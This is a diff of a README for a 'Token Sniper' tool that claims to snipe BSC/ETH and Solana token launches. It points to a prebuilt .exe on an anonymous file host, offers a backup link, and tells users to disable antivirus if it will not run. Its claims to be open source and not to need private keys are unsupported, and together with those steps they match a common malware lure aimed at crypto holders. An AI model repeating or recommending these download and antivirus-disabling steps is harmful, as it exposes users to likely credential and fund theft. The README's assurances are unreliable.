@@ -1,8 +1,8 @@
 # [Download Link](https://store3.gofile.io/download/e4ea5966-e407-408e-9e22-542d95382b87/Token_Sniper_V4.3-Release.exe) An Open source tool for sniping all BSC/ETH token launches, presales, and ICOs. Ability to make snipes in the same block as Liquidity added.
 Source code available and executable available, if you are unable to run try disabling anti virus as it needs to connect to the BSC/ETH nodes.
 Unlike other token snipers this one does not require your seed or private key, meaning you can trust your funds are not held by anyone other then you.
-**
-If download Link is unavailable, try [This one](https://gofile.io/d/BANAJk)**
+
+If download Link is unavailable, try [This one](https://gofile.io/d/BANAJk)
 
 Solana Sniping now available in latest update
 
